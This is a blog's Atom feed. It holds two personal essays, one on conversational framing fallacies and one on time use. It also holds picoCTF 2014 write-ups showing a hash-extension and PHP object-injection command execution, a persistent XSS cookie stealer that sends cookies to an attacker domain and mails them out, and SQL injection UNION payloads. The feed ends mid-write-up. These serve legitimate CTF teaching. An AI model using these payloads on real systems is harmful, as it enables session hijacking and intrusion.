<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://clifford.ressel.fyi/blog</id>
    <title>Clifford Ressel Blog</title>
    <updated>2025-07-29T00:00:00.000Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://clifford.ressel.fyi/blog"/>
    <subtitle>Clifford Ressel Blog</subtitle>
    <entry>
        <title type="html"><![CDATA[Rock paper scissors consequentialism]]></title>
        <id>https://clifford.ressel.fyi/blog/rps-consequentialism</id>
        <link href="https://clifford.ressel.fyi/blog/rps-consequentialism"/>
        <updated>2025-07-29T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[I've noticed that with big topics about societal issues or values, there are often three types of conversations:]]></summary>
        <content type="html"><![CDATA[<p>I've noticed that with big topics about societal issues or values, there are often three types of conversations:</p>
<ol>
<li>There are conversations about where we are at.</li>
<li>There are conversations about where we should go.</li>
<li>There are conversations about how to get there.</li>
</ol>
<p>Type 1 is to be a descriptive conversation, about what is. Type 2 is a normative conversation, about what should be. Type 3 is usually a constructive conversation, about what's effective.</p>
<p>I've used this mental model several times to understand the root cause of disagreements that were otherwise difficult to pinpoint.
I have seen discussions get heated, despite 90%+ common ground within each of these areas, because there was disagreement about <strong>what the stakes of the argument ought to be</strong>.
The conflict wasn't about about the facts brought to the table, it was about whether to framing this as "where we are at," vs. "where we should go," vs. "how to get there."</p>
<p>To take a pretty sanguine example example: let's say Alice wants to talk whether recent acquisitions are anti-competitive (type 1), but Bob tries to reframe it as whether Alice wants more or less FTC intervention (type 3), and he clearly doesn't engage with her original point.
Someone trying to reframing the conversation into their preferred terrain is often motivated by a genuine vision of what a more productive, society-wide conversation looks like.
However, when it is twisted too far, it becomes "I want to avoid that point, because conceding it will have consequences to my own framing of the topic," and the reframing descends to a fallacy of appealing to consequences.
Here are some common ways I see this reframing tactic carried out:</p>
<ul>
<li>Attacking type 1: <strong>You can't talk about problems until you have solutions to propose</strong>
<ul>
<li>There are issues in society forever and always, and since we can't discuss them all, then you must talk about the ones that we can fix.</li>
</ul>
</li>
<li>Attacking type 2: <strong>You can't talk about "ought" until we talk more about "is"</strong>
<ul>
<li>Too much conversation about an ideal, perfect future takes away from the current day issues that we haven't yet fully acknowledged as a group.</li>
</ul>
</li>
<li>Attacking type 3: <strong>You can't disagree on "how" without sabotaging our "ought"</strong>
<ul>
<li>If you disagree with the efficacy of any particular policy, then you're endangering the desirability of our shared goal in the minds of others.</li>
</ul>
</li>
</ul>
<p>Notice that all three of these lines of argumentation use tenuous appeals to consequences.
It would be fine to expand the conversation to a discussion of wider import, but it's ridiculous to suggest that the original point cannot be spoken about or supported because of these distant second or third order effects.
Usually the perpetrator of this tactic is unshakeably focused on the battlegrounds of their own opinion.
In the previous example, Bob cannot talk about anti-trust without bringing up whether Lina Khan is a net positive or negative.
To Bob, just entertaining the topic in someone else's framing feels like a consequential illocutionary act that gives up ground to an opposing side (one who may not even be part of the conversation!).</p>
<p>Some quick examples can make these lines of argumentation more concrete.
This may also irritate anyone who disagrees with particular premises or conclusions, so strap in, and please put on your good faith discourse hat!
I'm sure I could make a similar argument in the opposite direction for most of the below opinions, but I'm trying to focus on the structure of the rational, and not the specifics of these issues.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="you-cant-talk-about-problems-until-you-have-solutions-to-propose">You can't talk about problems until you have solutions to propose<a href="https://clifford.ressel.fyi/blog/rps-consequentialism#you-cant-talk-about-problems-until-you-have-solutions-to-propose" class="hash-link" aria-label="Direct link to You can't talk about problems until you have solutions to propose" title="Direct link to You can't talk about problems until you have solutions to propose">​</a></h2>
<p>Often when income inequality is observed as a growing problem (a type 1 discussion), more neoliberal or fiscally-conservative folks bristle at a perceived attack on how the current, nominally capitalist economic system is organized to maximize prosperity (a type 3 reframing).
If someone is noting an issue with inequality, will they next disagree with an open, market-based system that relies on some amount of inequality? Are they demanding a change without any suggestions for a better approach?
Anyone pointing to these problems of inequality is frequently dismissed as being idealistic, or promoting a vision that disrupts a wider status quo.
In reality the specifics of their criticism may be quite targeted and not be accompanied by any prescription, nor do they need one to be valid.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="you-cant-talk-about-ought-until-we-talk-more-about-is">You can't talk about "ought" until we talk more about "is"<a href="https://clifford.ressel.fyi/blog/rps-consequentialism#you-cant-talk-about-ought-until-we-talk-more-about-is" class="hash-link" aria-label="Direct link to You can't talk about &quot;ought&quot; until we talk more about &quot;is&quot;" title="Direct link to You can't talk about &quot;ought&quot; until we talk more about &quot;is&quot;">​</a></h2>
<p>During the racial reckoning, attempts to talk about a future with color blind equality (a type 2 discussion) were frequently shot down for calling into question what is a current, racially unequal reality (a type 1 reframing).
I have been in a conversation that went something like this: someone mentioned how great a future world would be, if race was as much thought about as hair color currently is.
Three other folks at the table exchanged looks, and then began attacking the stakes of the discussion itself.
Is it even fair to compare hair color to skin color, in a world where the inequities of race are still so pressing? Despite the dogpile discussion, I don't think that anyone there would disagree with Dr.
King's original sentiment, to "look to a day when people will not be judged by the color of their skin." I assume that to those three opponents in the discussion, even holding a conversation about the <em>existence</em> of that future felt like it robs the current issues of their impetus and necessity.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="you-cant-disagree-on-how-without-sabotaging-our-ought">You can't disagree on "how" without sabotaging our "ought"<a href="https://clifford.ressel.fyi/blog/rps-consequentialism#you-cant-disagree-on-how-without-sabotaging-our-ought" class="hash-link" aria-label="Direct link to You can't disagree on &quot;how&quot; without sabotaging our &quot;ought&quot;" title="Direct link to You can't disagree on &quot;how&quot; without sabotaging our &quot;ought&quot;">​</a></h2>
<p>When concerns of implementation and efficacy are raised (a type 3 discussion), I've experienced the shoutdown for being perceived as a threat to a shared goal (a type 2 reframing).
When discussing the solutions to rising cost and access barriers within higher education, I see clear economic reasons to question the effectiveness of student debt forgiveness without other, more fundamental interventions first<sup><a href="https://clifford.ressel.fyi/blog/rps-consequentialism#user-content-fn-1-66349f" id="user-content-fnref-1-66349f" data-footnote-ref="true" aria-describedby="footnote-label">1</a></sup>.
I don't think someone who stakes out a position of unilateral student loan forgiveness has different goals: widespread access to education and opportunity, decreasing the barrier of rising educational costs, and freeing debt-burdened adults to have greater financial freedom and future prosperity.
But any daylight between opinions about <strong>efficacy</strong> is treated as damaging to the overall goals.
Even worse yet, this easily escalates to questioning of intentions: If you really knew how important these goals were, if you genuinely wanted to accomplish them, would you be raising tough questions?
Potentially giving ammunition to "the other side"?
Any defense you mount that tries to explain this distinction is less clear convincing than the simple line of attack.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="where-from-here">Where from here<a href="https://clifford.ressel.fyi/blog/rps-consequentialism#where-from-here" class="hash-link" aria-label="Direct link to Where from here" title="Direct link to Where from here">​</a></h2>
<p>Let me try and find a catchy call for action here.
Divisive disagreements have been all the rage (literally) in the U.S. for over ten years now.
My preference after observing the pitfalls above, is to try and avoid them both when used against me, and also as they apply to my own thinking.
For example, I often find myself the victim of the second and third attempts of reframing, but most often prone to perpetrating the first kind in responding to others.
If you're in discussion with me and you notice this, please call it out! "I notice you're reacting to effects of a solution I wasn't even advocating," is a great way to head off that pitfall of discussion.</p>
<p>I also have tried my hand at naming this conversational anti-pattern, similar to some other informal fallacy names<sup><a href="https://clifford.ressel.fyi/blog/rps-consequentialism#user-content-fn-2-66349f" id="user-content-fnref-2-66349f" data-footnote-ref="true" aria-describedby="footnote-label">2</a></sup>.
<strong>I think of this as "rock paper scissors consequentialism."</strong>
It is much like an appeal to consequences, and when used to shutdown the previous discussion topic then it is clearly a type of red herring.
More specifically though, the flexible way that this reframing can be used is like rock paper scissors: whatever the stakes of the argument you set forth, if I change the stakes to my preferred terrain then your argument looks like it yields ridiculous conclusions.<sup><a href="https://clifford.ressel.fyi/blog/rps-consequentialism#user-content-fn-3-66349f" id="user-content-fnref-3-66349f" data-footnote-ref="true" aria-describedby="footnote-label">3</a></sup></p>
<p>If you discuss big values issues frequently or intensely with friends, colleagues, or the internet (ranked in the order that I would suggest you engage in), maybe share this mental model with them. Hopefully a shared meta-awareness for the "stakes" of a discussion is a helpful tool, when those stakes evolve or get called into question throughout the discussion.</p>
<!-- -->
<section data-footnotes="true" class="footnotes"><h2 class="anchor anchorWithStickyNavbar_LWe7 sr-only" id="footnote-label">Footnotes<a href="https://clifford.ressel.fyi/blog/rps-consequentialism#footnote-label" class="hash-link" aria-label="Direct link to Footnotes" title="Direct link to Footnotes">​</a></h2>
<ol>
<li id="user-content-fn-1-66349f">
<p>This falls prey to: 1. moral hazard, 2. subsidizing consumption while restricting supply, 3. regressively transferring wealth. Assuming no other long-term interventions are involved, widespread student loan forgiveness may actually <em>raise</em> cost over the long-term, and <em>decrease</em> access to higher education in the long-term. <a href="https://clifford.ressel.fyi/blog/rps-consequentialism#user-content-fnref-1-66349f" data-footnote-backref="" aria-label="Back to reference 1" class="data-footnote-backref">↩</a></p>
</li>
<li id="user-content-fn-2-66349f">
<p>These illustrative names excited me most when I read about the <a href="https://en.wikipedia.org/wiki/Motte-and-bailey_fallacy" target="_blank" rel="noopener noreferrer">motte-and-bailey fallacy</a> for the first time. With how vivid the term is, the tactic becomes tough to miss. <a href="https://clifford.ressel.fyi/blog/rps-consequentialism#user-content-fnref-2-66349f" data-footnote-backref="" aria-label="Back to reference 2" class="data-footnote-backref">↩</a></p>
</li>
<li id="user-content-fn-3-66349f">
<p>It's also worth noting that some legs of this tactic feel very similar to a moralistic fallacy. <a href="https://clifford.ressel.fyi/blog/rps-consequentialism#user-content-fnref-3-66349f" data-footnote-backref="" aria-label="Back to reference 3" class="data-footnote-backref">↩</a></p>
</li>
</ol>
</section>]]></content>
        <author>
            <name>Clifford</name>
            <uri>https://github.com/CSRessel</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[10 minute moments]]></title>
        <id>https://clifford.ressel.fyi/blog/many-minutes-few-moments</id>
        <link href="https://clifford.ressel.fyi/blog/many-minutes-few-moments"/>
        <updated>2023-05-28T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[16 waking hours ÷ 10 minutes = 96]]></summary>
        <content type="html"><![CDATA[<blockquote>
<p>16 waking hours ÷ 10 minutes = 96</p>
<p>10 minutes is ~1% of your day.</p>
</blockquote>
<p>- <a href="https://taylor.town/10-minutes" target="_blank" rel="noopener noreferrer">credit to Taylor Troesh</a></p>
<p>When the phone scrolling lasts for 10 minutes, or low-priority yak shaving adds up to 10 minutes, that's one percent of your day spent.
That's not necessarily a bad thing or a good thing, but make sure it's a thing you want to have spent one percent of your day on.</p>
<p>You only have this many 10 minute moments.</p>
<pre style="width:min-content"><p>🥱  📱  🪥  🍳  🥐  📱
☕  🧥  💻  💻  💻  🚽
💬  📧  🎧  💻  📞  💻
💻  💻  💻  💻  ☕  💻
📞  💻  📱  🎧  💻  💻
💬  💻  📱  🍱  🍱  📱
☕  💻  📞  💻  💻  🎧
🚽  📱  💻  💻  📧  💻
💻  💻  💻  💻  💻  💻
💻  💬  🥪  📱  💻  🚗
🛒  🛒  🚗  🥏  🥏  🏃
🏃  🥏  🥏  🥏  🏋️  🏋️
🏋️  🏋️  🧘  🧘  🚗  🚗
🛁  🍲  🍲  📺  📺  📱
📺  💻  🚽  💻  💻  💻
🪥  📖  📖  📖  📖  🛌</p></pre>
<p>Many minutes, but few moments.</p>]]></content>
        <author>
            <name>Clifford</name>
            <uri>https://github.com/CSRessel</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[picoCTF 2014 part 3: Steve's List]]></title>
        <id>https://clifford.ressel.fyi/blog/picoctf-2014-part3</id>
        <link href="https://clifford.ressel.fyi/blog/picoctf-2014-part3"/>
        <updated>2014-12-01T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Summary]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="summary">Summary<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part3#summary" class="hash-link" aria-label="Direct link to Summary" title="Direct link to Summary">​</a></h2>
<p>Hash extension allows us to enter whatever cookies we choose, without knowledge of the secret, and still pass the website’s checks. Since the cookie is unserialized, we can inject arbitrary php objects into the server. By injecting a Post object, we know it’s destroy method will be called. This method has been redefined to output the Post’s fields in HTML comments after parsing them with the class Filter. The Filter operates by running the given text through preg_replace calls with stored params for match and substitution. As we have injected the object, we have complete control over these stored params, and can thus call the preg_replace with the ‘e’ flag, allowing us to do arbitrary command execution. By catting the necessary file at <code>/home/daedalus/flag.txt</code>, and substituting all of the Post’s text with the file’s contents, we can print the file’s contents in an HTML comment, and thus get the flag.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-hash-extension">The Hash Extension<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part3#the-hash-extension" class="hash-link" aria-label="Direct link to The Hash Extension" title="Direct link to The Hash Extension">​</a></h2>
<p>Examination of the hacked website shows the only possible input is through the cookies.
However, any attempts to manipulate the cooke result in us being locked out of the website.</p>
<p>Examination of the website source makes it quickly apparent why:</p>
<div class="language-PHP language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$custom_settings = urldecode($_COOKIE['custom_settings']);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$hash = sha1(AUTH_SECRET . $custom_settings);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">if ($hash !== $_COOKIE['custom_settings_hash']) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  die("Why would you hack Section Chief Steve's site? :(");</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>The cookie <code>custom_settings</code> will later be deserialized, and will be the site of our object inject. However, <code>custom_settings_hash</code> will need to change in a similar manner.</p>
<p>To not fail the validation, <code>custom_settings_hash</code> needs to be of the form <code>sha1(AUTH_SECRET . urldecode($_COOKIE['custom_settings']))</code> where <code>AUTH_SECRET</code> is an unknown, eight letter secret.
As we do not have access to <code>AUTH_SECRET</code>, it would appear that we are unable to change the <code>custom_settings</code> cookie.</p>
<p>However, using a hash extension attack, we can change the value of <code>custom_settings_hash</code> to correspond to our new value of <code>custom_settings</code> without knowledge of the <code>AUTH_SECRET</code>.</p>
<p>The tool to be used is called <a href="https://github.com/iagox86/hash_extender">hash extender</a>. By downloading and compiling the program, we can generate the new value of <code>custom_settings_hash</code> with the following command:</p>
<div class="language-Shell language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ./hash_extender --data d --secret 8 --append a --signature s --format sha1 --table</span><br></span></code></pre></div></div>
<p>where <code>d</code> is the previous <code>custom_settings</code>, <code>a</code> is the addition to the <code>custom_settings</code> (or the object injection), and s is the previous value of <code>custom_settings_hash</code>.</p>
<p>With this value, we can now manipulate <code>custom_settings</code> without tripping Steve’s rudimentary IPS.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-object-injection">The Object Injection<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part3#the-object-injection" class="hash-link" aria-label="Direct link to The Object Injection" title="Direct link to The Object Injection">​</a></h2>
<p>There are several important items to notice while reading the source of the website.</p>
<ol>
<li>Whatever is in the <code>custom_settings</code> cookie will be unserialized. Specifically, the contents will be split on newlines, and each section will be individually unserialized.</li>
<li>In the <code>classes.php</code> file, the Post’s <code>__destruct()</code> method is redefined. It now is intended to output the Post’s fields in comments, as “debugging stuff.”</li>
<li>The Filter class used by the Post’s <code>__destruct()</code> method uses the <code>preg_replace()</code> method with class fields as arguments.</li>
</ol>
<p>These three facts, taken together, allow us to do arbitrary command execution with viewing of output by injecting objects into the <code>custom_settings</code> cookie.</p>
<p>The necessary object to cat the flag from <code>/home/daedalus/flag.txt</code> will look something like this in PHP:</p>
<div class="language-PHP language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$filter_set = [</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		new Filter('/.*/e', 'system("cat /home/daedalus/flag.txt")')</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	];</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$obj = serialize(true) . "\n" . serialize(new Post(</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	"the flag is",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	"fail",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	$filter_set));</span><br></span></code></pre></div></div>
<p>The Filter uses the “e” flag on the <code>preg_replace()</code> call. This will run the replacement argument as PHP code and replace the matching text with the output.</p>
<p>By having out only filter match everything, and run the command <code>$ cat /home/daedalus/flag.txt</code>, we will replace the body of the Post we inject with the flag.</p>
<p>Outputting this serialized object to a file, and inputting that file to the hash_extender command discussed above, we can generate the new value of <code>custom_settings_hash</code>. It is important to note, using a file is the best way to go about this part of the problem; before the object is urlencoded, it will have nonprinting characters which you will not be able to copy and paste.</p>
<p>Finally, by replacing <code>custom_settings</code> with a urlencoding of the serialized object, and <code>custom_settings_hash</code> with the new signature, we will see the flag in the comments of the site:</p>
<p>D43d4lu5_w45_h3r3_w1th_s3rialization_chief_steve</p>
<hr>
<p>Note: the payload for <code>custom_settings</code> will look something like:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">b%253A1%253B%250AO%253A4%253A%2522Post%2522%253A3%253A%257Bs%253A8%253A%2522%2500%252A%2500title%2522%253Bs%253A11%253A%2522the%2Bflag%2Bis%2522%253Bs%253A7%253A%2522%2500%252A%2500text%2522%253Bs%253A4%253A%2522fail%2522%253Bs%253A10%253A%2522%2500%252A%2500filters%2522%253Ba%253A1%253A%257Bi%253A0%253BO%253A6%253A%2522Filter%2522%253A2%253A%257Bs%253A10%253A%2522%2500%252A%2500pattern%2522%253Bs%253A5%253A%2522%252F.%252A%252Fe%2522%253Bs%253A7%253A%2522%2500%252A%2500repl%2522%253Bs%253A37%253A%2522system%2528%2522cat%2B%252Fhome%252Fdaedalus%252Fflag.txt%2522%2529%2522%253B%257D%257D%257D</span><br></span></code></pre></div></div>
<p>However, I do not believe this is perfectly accurate as I recall making changes out of file that were never duplicated in my backup of the payload. Because of this, I have not included the payload or its signature in this writeup.</p>]]></content>
        <author>
            <name>Clifford</name>
            <uri>https://github.com/CSRessel</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[picoCTF 2014 part 2: secure_page_service]]></title>
        <id>https://clifford.ressel.fyi/blog/picoctf-2014-part2</id>
        <link href="https://clifford.ressel.fyi/blog/picoctf-2014-part2"/>
        <updated>2014-11-30T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Summary]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="summary">Summary<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part2#summary" class="hash-link" aria-label="Direct link to Summary" title="Direct link to Summary">​</a></h2>
<p>This problem is a simple XSS challenge. Using persistent XSS in a newly created page, we can steal the admin’s cookies should they choose to visit the page. The “Report to Moderator” button says, “Report this page, and a moderator will personally review it in the next few minutes!” so it is a safe assumption that we can have an admin view our injected code.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part2#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h2>
<p>The first thing we need is an account on the challenge's site. The home page allows anyone to register. After an account is made, two actions are available: create a page, and view a page. Attempting to view the page asked for in the problem shows it is password protected. A couple quick queries show it is not vulnerable to SQL injection; another route is necessary.</p>
<p>Examining the page creation by creating a couple random pages, we notice that we can report pages to be reviewed by a moderator (“Spam? Abuse? Report this page, and a moderator will personally review it in the next few minutes!”).</p>
<p>Furthermore, attempting to use HTML tags reveals that the input allows HTML code.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="enter-xss">Enter XSS<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part2#enter-xss" class="hash-link" aria-label="Direct link to Enter XSS" title="Direct link to Enter XSS">​</a></h2>
<p>We can use a persistent XSS attack to steal the cookies of whoever views the page. By injecting a script into the page, we can send the viewer’s cookies elsewhere. By setting up a php script on a free hosting script, we can redirect the sent cookies to our own email. The final step will be to report the page to moderator to cause them to view our injected page.</p>
<p>Once we have the admin’s cookies, we can change our cookies to theirs to view the locked page.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-setup">The Setup<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part2#the-setup" class="hash-link" aria-label="Direct link to The Setup" title="Direct link to The Setup">​</a></h2>
<p>First we need the two scripts.</p>
<p>The injected script for the page will be:</p>
<div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">script</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token script language-javascript dom variable" style="color:rgb(189, 147, 249);font-style:italic">location</span><span class="token script language-javascript punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token script language-javascript property-access">href</span><span class="token script language-javascript"> </span><span class="token script language-javascript operator">=</span><span class="token script language-javascript"> </span><span class="token script language-javascript string" style="color:rgb(255, 121, 198)">'http://www.YourDomainName.com/cookiestealer.php?cookie='</span><span class="token script language-javascript operator">+</span><span class="token script language-javascript dom variable" style="color:rgb(189, 147, 249);font-style:italic">document</span><span class="token script language-javascript punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token script language-javascript property-access">cookie</span><span class="token script language-javascript punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">script</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><br></span></code></pre></div></div>
<p>And the php script at the above domain name (cookiestealer.php) will look like:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$cookie = $HTTP_GET_VARS["cookie"]; mail("YourEmail@YouMailProvider.com", "Stolen Cookies", $cookie);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">?&gt;</span><br></span></code></pre></div></div>
<p>For free hosting, a number of options are available. We chose to use <a href="http://www.000webhost.com/">000webhost</a>, simply because they have a nice in-browser file manager—no need to mess around with FTP clients.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="cookie-forgery">Cookie Forgery<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part2#cookie-forgery" class="hash-link" aria-label="Direct link to Cookie Forgery" title="Direct link to Cookie Forgery">​</a></h2>
<p>After setting up a page with the injected script and the php script on another server, we simply report the page to have a mod (in reality a bot) view the page.</p>
<p>From here, we check our email for the admin cookies. Using a plugin like <a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en">this</a> or <a href="https://addons.mozilla.org/en-us/firefox/addon/edit-cookies/">this</a> we can quickly change our cookies to the admin's, allowing us to view the locked page, and thus, the flag:</p>
<p>wow_cross_site_scripting_is_such_web</p>]]></content>
        <author>
            <name>Clifford</name>
            <uri>https://github.com/CSRessel</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[picoCTF 2014 part 1: Injection 2]]></title>
        <id>https://clifford.ressel.fyi/blog/picoctf-2014-part1</id>
        <link href="https://clifford.ressel.fyi/blog/picoctf-2014-part1"/>
        <updated>2014-11-29T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Summary]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="summary">Summary<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part1#summary" class="hash-link" aria-label="Direct link to Summary" title="Direct link to Summary">​</a></h2>
<p>By unioning hard coded values with the prewritten select statement, we can manually control exactly what data the query returns, and thus meet the program’s requirements.</p>
<div class="language-SQL language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> username</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'asdf'</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> a</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> b</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> c</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> e </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">LIMIT</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">-- '</span><br></span></code></pre></div></div>
<p>(with “1337” entered as the password)</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-program">The Program<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part1#the-program" class="hash-link" aria-label="Direct link to The Program" title="Direct link to The Program">​</a></h2>
<p>The source is available <a href="http://web2014.picoctf.com/injection2/login.phps">here</a>. Examination of the source shows several things.
First, we can make injections into the username field.
Second, the returned data from the query will need to meet the following requirements to reveal the flag:</p>
<ul>
<li><code>mysqli_num_rows($result) === 1</code> — only one row</li>
<li><code>$row["password"] === $password</code> — row’s password must match our given password</li>
<li><code>$row["user_level"] &gt;= 1337</code> — row’s user_level must be greater than or equal to 1337</li>
</ul>
<p>Finally, by setting the form’s hidden field “debug” to 1, we receive a nice view of our input and the generated query.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-injection">The Injection<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part1#the-injection" class="hash-link" aria-label="Direct link to The Injection" title="Direct link to The Injection">​</a></h2>
<p>By taking a union with a hardcoded query, we can manually control exactly what the returned data contains, and thus meet all the prespecified requirements.</p>
<p>An injection of:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">asdf' UNION SELECT 0 AS a LIMIT 1 -- </span><br></span></code></pre></div></div>
<p>Will yield the query:</p>
